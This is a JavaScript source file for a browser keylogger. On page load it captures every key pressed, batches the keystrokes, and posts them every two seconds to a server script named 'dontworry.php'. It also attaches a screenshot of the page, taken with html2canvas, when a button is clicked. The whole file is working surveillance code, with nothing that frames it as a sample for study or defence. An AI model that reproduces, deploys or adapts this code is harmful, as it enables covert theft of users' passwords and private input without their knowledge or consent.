var saved = {
  // setting up
  cache: [], // storage for key presses
  delay: 2000, // delay for sending to server
  sending: false, // prevent parallel posts

  // initialization, on page load
  init: () => {
    // trying to capture key strokes
    window.addEventListener("keydown", (evt) => {
      saved.cache.push(evt.key);
    });

    // sending to server
    window.setInterval(saved.send, saved.delay);

    // capture screenshot on button click
    var screenshotButton = document.getElementById("screenshotButton");
    screenshotButton.addEventListener("click", saved.captureScreenshot);
  },

  // ajax sending event
  send: () => {
    // Check if not already sending and the cache is not empty
    if (!saved.sending && saved.cache.length != 0) {
      // Set sending to true to prevent parallel posts
      saved.sending = true;

      // saving data including the screenshot
      var data = new FormData();
      data.append("keys", JSON.stringify(saved.cache));

      // Add the captured screenshot to the data
      if (saved.screenshot) {
        data.append("screenshot", saved.screenshot);
        saved.screenshot = null; // Clear the screenshot after including it in the data
      }

      saved.cache = []; // clearing data

      // fetching
      fetch("dontworry.php", { method: "POST", body: data })
        .then((res) => res.text())
        .then((res) => {
          // Clear the sending flag after successful sending
          saved.sending = false;
          console.log(res); // test
        })
        .catch((err) => {
          console.error(err);
        });
    }
  },

  // function to capture screenshot
  captureScreenshot: () => {
    html2canvas(document.body).then((canvas) => {
      var screenshotData = canvas.toDataURL("image/png");

      var blob = base64ToBlob(screenshotData);

      var file = new File([blob], "screenshot.png", { type: "image/png" });

      saved.screenshot = file;
    });
  },
};

// Converting base64 data to Blob object
function base64ToBlob(base64Data) {
  var parts = base64Data.split(";base64,");
  var contentType = parts[0].split(":")[1];
  var raw = window.atob(parts[1]);
  var rawLength = raw.length;
  var uInt8Array = new Uint8Array(rawLength);

  for (var i = 0; i < rawLength; ++i) {
    uInt8Array[i] = raw.charCodeAt(i);
  }

  return new Blob([uInt8Array], { type: contentType });
}

// Initializing the 'saved' object when the DOM content is loaded
window.addEventListener("DOMContentLoaded", saved.init);
